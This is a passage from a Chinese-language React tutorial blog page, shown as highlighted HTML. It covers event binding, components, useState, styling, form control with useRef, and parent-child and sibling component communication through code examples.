class="name">div</span>&gt;</span>三图模式模版<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123; getArticleJSX() &#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="React-事件绑定"><a href="#React-事件绑定" class="headerlink" title="React 事件绑定"></a>React 事件绑定</h1><h2 id="基本实现"><a href="#基本实现" class="headerlink" title="基本实现"></a>基本实现</h2><p>通过语法 <code>on + 事件名称 = &#123; 事件处理程序 &#125;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandle</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;clickHandle&#125;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h2 id="使用事件参数"><a href="#使用事件参数" class="headerlink" title="使用事件参数"></a>使用事件参数</h2><p>在事件回调函数中设置形参即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandle</span> = (<span class="params">e</span>) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了&#x27;</span>, name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;clickHandle&#125;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h2 id="传递自定义参数"><a href="#传递自定义参数" class="headerlink" title="传递自定义参数"></a>传递自定义参数</h2><p>事件绑定的位置改造成箭头函数的写法，在执行实际处理业务函数的时候传递实参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandle</span> = (<span class="params">name</span>) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了&#x27;</span>, name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> clickHandle(&#x27;按钮&#x27;)&#125;&gt;点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><ul><li>注意：不能直接写函数调用，这里事件绑定需要一个函数引用</li></ul><h2 id="同时传递事件对象和自定义参数"><a href="#同时传递事件对象和自定义参数" class="headerlink" title="同时传递事件对象和自定义参数"></a>同时传递事件对象和自定义参数</h2><p>在事件绑定的位置传递事件实参 e 和自定义参数，需要声明形参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandle</span> = (<span class="params">name, e</span>) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了&#x27;</span>, name, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;(e)</span> =&gt;</span> clickHandle(&#x27;按钮&#x27;, e)&#125;&gt;点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h1 id="React-组件使用"><a href="#React-组件使用" class="headerlink" title="React 组件使用"></a>React 组件使用</h1><p>在 React 中，一个组件就是首字母大写的函数，内部存放了组件的逻辑和视图UI，渲染组件只需要把组件当成标签书写即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Button</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;/* 自闭和 */&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Button</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;/* 成对标签 */&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Button</span>&gt;</span><span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="组件状态管理-useState"><a href="#组件状态管理-useState" class="headerlink" title="组件状态管理-useState"></a>组件状态管理-useState</h1><p>useState 是一个 React Hook （函数），它允许我们向组件添加一个状态变量，从而实现响应式变量，控制组件渲染结构（数据驱动视图）</p><ol><li>useState 是一个函数，返回值是一个数组</li><li>数组中的第一个参数是状态变量，第二个参数是 set 函数，用来修改状态变量</li><li>useState 的参数将作为 count 的初始值</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="title function_">setCount</span>(count + <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;clickHandler&#125;</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h2 id="状态修改规则"><a href="#状态修改规则" class="headerlink" title="状态修改规则"></a>状态修改规则</h2><p>在 React 中，状态是<strong>只读的</strong>，只能替换它不能修改它，直接修改不会引发视图更新</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如上面的例子，直接自增是不能实现视图更新的</span></span><br><span class="line"><span class="title function_">setCount</span>(++count)</span><br><span class="line"><span class="comment">// 需要传入新的值，使新的值得以渲染</span></span><br><span class="line"><span class="title function_">setCount</span>(count + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="修改对象状态"><a href="#修改对象状态" class="headerlink" title="修改对象状态"></a>修改对象状态</h2><p>对于对象类型的状态变量，始终传给 set 方法一个<strong>全新的对象</strong>来进行修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(&#123;</span><br><span class="line">        <span class="attr">num</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="title function_">setCount</span>(&#123;</span><br><span class="line">            ...count,</span><br><span class="line">            <span class="attr">num</span>: count.<span class="property">num</span> + <span class="number">1</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;React&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;count.name&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;clickHandler&#125;</span>&gt;</span>&#123;count.num&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h1 id="组件样式处理"><a href="#组件样式处理" class="headerlink" title="组件样式处理"></a>组件样式处理</h1><ol><li>行内样式</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span>&#x27;<span class="attr">red</span>&#x27;&#125;&#125;&gt;</span>this is div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>对象样式</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nameStyle = &#123;</span><br><span class="line">    <span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span>,</span><br><span class="line">    <span class="attr">fontSize</span>: <span class="string">&#x27;50px&#x27;</span></span><br><span class="line">&#125; <span class="comment">// 通过对象的方式传入样式</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(&#123;</span><br><span class="line">        <span class="attr">num</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">clickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="title function_">setCount</span>(&#123;</span><br><span class="line">            ...count,</span><br><span class="line">            <span class="attr">num</span>: count.<span class="property">num</span> + <span class="number">1</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;React&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;nameStyle&#125;</span>&gt;</span>&#123;count.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;clickHandler&#125;</span>&gt;</span>&#123;count.num&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>class 类名控制（导入样式表）</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./index.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&quot;foo&quot;</span>&gt;</span>this is span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="React-表单控制"><a href="#React-表单控制" class="headerlink" title="React 表单控制"></a>React 表单控制</h1><h2 id="受控绑定"><a href="#受控绑定" class="headerlink" title="受控绑定"></a>受控绑定</h2><p>使用 React 组件的状态（useState）控制表单的状态</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/01.png" alt="01.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">value</span>=<span class="string">&#123;value&#125;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onChange</span>=<span class="string">&#123;e</span> =&gt;</span> setValue(e.target.value)&#125;</span></span><br><span class="line"><span class="language-xml">        /&gt;</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非受控绑定"><a href="#非受控绑定" class="headerlink" title="非受控绑定"></a>非受控绑定</h2><p>通过获取 DOM 的方式获取表单的输入数据</p><p>在 React 组件中获取&#x2F;操作 DOM，需要使用 useRef React Hook钩子函数，分为两步：</p><ol><li>使用 useRef 创建 ref 对象，并与 JSX 绑定</li><li>在 DOM 可用时，通过 <code>inputRef.current</code> 拿到 DOM 对象</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRef &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> inputRef = <span class="title function_">useRef</span>(<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">onChange</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(inputRef.<span class="property">current</span>.<span class="property">value</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">ref</span>=<span class="string">&#123;inputRef&#125;</span> <span class="attr">onChange</span>=<span class="string">&#123;onChange&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="React-组件通信"><a href="#React-组件通信" class="headerlink" title="React 组件通信"></a>React 组件通信</h1><h2 id="父子通信-父传子"><a href="#父子通信-父传子" class="headerlink" title="父子通信-父传子"></a>父子通信-父传子</h2><ol><li>父组件传递数据：在子组件标签上绑定属性</li><li>子组件接收数据：子组件通过 props 参数接收数据</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;props.text&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&#x27;this is name&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Son</span> <span class="attr">text</span>=<span class="string">&#123;name&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>props</strong>可以<strong>传递任意的合法数据</strong>，比如数字、字符串、布尔值、数组、对象、函数、JSX</p><p>props是<strong>只读对象</strong>，子组件只能读取 props 中的数据，不能直接进行修改，父组件的数据只能由父组件修改</p><p>当我们的内容嵌套在组件的标签内部时，组件会自动在名为 children 的 props 属性中接收该内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;props.text&#125;&#123;props.children&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&#x27;this is name,&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Son</span> <span class="attr">text</span>=<span class="string">&#123;name&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>Hello React<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="父子通信-子传父"><a href="#父子通信-子传父" class="headerlink" title="父子通信-子传父"></a>父子通信-子传父</h2><p>在子组件中调用父组件中的函数并传递参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> sonMsg = <span class="string">&#x27;this is son\&#x27;s message&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;props.text&#125;&#123;props.children&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>props.onGetMsg(sonMsg)&#125;&gt;OK<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&#x27;this is name,&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">getMsg</span> = (<span class="params">msg</span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Son</span> <span class="attr">text</span>=<span class="string">&#123;name&#125;</span> <span class="attr">onGetMsg</span>=<span class="string">&#123;getMsg&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>Hello React<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="兄弟组建通信"><a href="#兄弟组建通信" class="headerlink" title="兄弟组建通信"></a>兄弟组建通信</h2><p>借助状态提升机制，通过共同的父组件进行兄弟之间的数据传递</p><ol><li>A 组件先通过子传父的方式将数据传递给父组件 App</li><li>App 拿到数据之后通过父传子的方式传递给 B 组件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">A</span> (&#123; onGetAName &#125;) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&#x27;this is A name&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            this is A compnent,</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> onGetAName(name)&#125;&gt;send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span 